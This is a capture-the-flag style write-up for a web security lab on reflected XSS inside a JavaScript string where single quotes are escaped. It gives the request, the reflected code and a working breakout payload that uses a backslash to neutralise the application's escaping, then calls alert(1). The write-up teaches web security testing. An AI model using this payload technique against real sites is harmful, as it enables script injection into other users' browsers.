## 19 - Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.

To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.

## Notes

- Search page
- Possibility to leave a comment on a post

## Resume

1. Capture a search request
2. Identify the reflected JavaScript context
3. Test escaping behavior
4. Escape the JavaScript string
5. Inject JavaScript code
6. Trigger the XSS

## Solve

First, capture a search request:

```http
GET /?search=pouet HTTP/2
Host: 0a3e00980375e6e180a303a100970025.web-security-academy.net
```

The search value is reflected inside a JavaScript string:

```html
<script>
    var searchTerms = 'pouet';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

This confirms that user input is inserted into a JavaScript context.

Try the following payload:

```text
test'payload
```

The application escapes the single quote using a backslash:

```javascript
var searchTerms = 'test\'payload';
```

This prevents breaking out of the string directly.

Now test:

```text
test\payload
```

The backslash is **not escaped** by the application.

This behavior allows us to escape the application's escaping mechanism itself.

Payload:

```javascript
\'-alert(1)//
```

Encoded URL:

```text
https://0a3e00980375e6e180a303a100970025.web-security-academy.net/?search=%5C%27-alert(1)//
```

The application attempts to escape single quotes by inserting a backslash:

```javascript
var searchTerms = '\\'-alert(1)//';
```

The injected backslash escapes the application's escaping backslash, which causes the following single quote to terminate the string.

Then:

```javascript
-alert(1)
```

is executed as JavaScript code.

Finally:

```javascript
//
```

comments out the remaining trailing characters to avoid syntax errors.

When the page loads, the browser executes:

```javascript
alert(1)
```

This triggers the XSS and solves the lab.